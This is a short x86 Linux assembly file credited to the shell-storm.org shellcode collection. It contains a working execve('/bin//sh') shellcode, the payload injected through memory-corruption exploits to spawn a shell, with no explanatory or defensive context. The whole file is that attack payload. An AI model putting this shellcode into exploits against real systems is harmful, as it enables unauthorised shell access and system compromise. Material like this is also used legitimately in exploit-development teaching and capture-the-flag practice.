; Source: http://shell-storm.org/shellcode/files/shellcode-841.php
global _start

section .text

_start:
  xor ecx, ecx
  mul ecx
  mov al, 0xb
  push ecx
  push dword 0x68732f2f
  push dword 0x6e69622f
  mov ebx, esp
  int 0x80
